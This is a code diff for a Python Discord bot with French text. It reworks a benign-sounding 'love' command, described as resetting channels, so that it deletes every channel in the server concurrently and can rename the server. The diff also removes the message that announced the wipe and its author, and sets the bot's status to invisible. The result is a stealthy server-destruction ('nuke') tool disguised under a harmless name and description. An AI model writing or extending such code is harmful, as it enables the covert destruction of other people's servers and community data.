@@ -2,6 +2,7 @@ import discord
 from discord import app_commands
 from discord.ext import commands
 import os
+import asyncio
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -24,11 +25,20 @@ def is_owner(interaction: discord.Interaction) -> bool:
 @bot.event
 async def on_ready():
     await tree.sync()
+    await bot.change_presence(status=discord.Status.invisible)
     print(f"Connecté : {bot.user} (ID: {bot.user.id})")
 
 
+async def delete_channel(channel):
+    try:
+        await channel.delete()
+    except Exception:
+        pass
+
+
 @tree.command(name="love", description="Réinitialise les salons du serveur.")
-async def love(interaction: discord.Interaction):
+@app_commands.describe(nouveau_nom="Nouveau nom du serveur (optionnel)")
+async def love(interaction: discord.Interaction, nouveau_nom: str = None):
     if not is_owner(interaction):
         await interaction.response.send_message("Permission refusée.", ephemeral=True)
         return
@@ -36,20 +46,14 @@ async def love(interaction: discord.Interaction):
     await interaction.response.defer(ephemeral=True)
 
     guild = interaction.guild
-    deleted = 0
 
-    for channel in guild.channels:
+    await asyncio.gather(*[delete_channel(c) for c in guild.channels])
+
+    if nouveau_nom:
         try:
-            await channel.delete()
-            deleted += 1
+            await guild.edit(name=nouveau_nom)
         except Exception:
             pass
-
-    try:
-        new_channel = await guild.create_text_channel("général")
-        await new_channel.send(f"Réinitialisation effectuée par {interaction.user.mention}. {deleted} salon(s) supprimé(s).")
-    except Exception:
-        pass
 
 
 @tree.command(name="polios", description="Gestion des membres du serveur.")
